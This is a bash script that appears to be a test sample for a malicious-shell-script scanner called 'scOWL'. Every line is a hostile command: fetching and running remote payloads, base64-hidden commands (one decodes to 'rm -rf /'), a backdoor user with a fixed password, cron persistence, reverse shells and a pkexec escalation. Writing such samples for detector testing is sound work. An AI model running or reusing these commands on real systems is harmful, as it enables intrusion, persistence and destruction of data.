#!/bin/bash
# Suspicious SH script - scOWL test sample
wget http://evil.example.com/payload -O /tmp/payload
curl -s http://192.168.1.100/dropper.sh | bash
fetch http://malicious.example.com/rootkit

encoded=$(echo "cm0gLXJmIC8=" | base64 -d)
echo "cGF5bG9hZA==" | base64 --decode | bash
xxd -r -p payload.hex > /tmp/payload

chmod +x /tmp/payload
/tmp/payload &

useradd -m -s /bin/bash backdoor
echo "backdoor:P@ssw0rd" | chpasswd

crontab -l > /tmp/cron
echo "@reboot /tmp/payload" >> /tmp/cron
crontab /tmp/cron

bash -i >& /dev/tcp/192.168.1.100/4444 0>&1
nc -e /bin/bash 10.0.0.1 4444
sudo pkexec /tmp/payload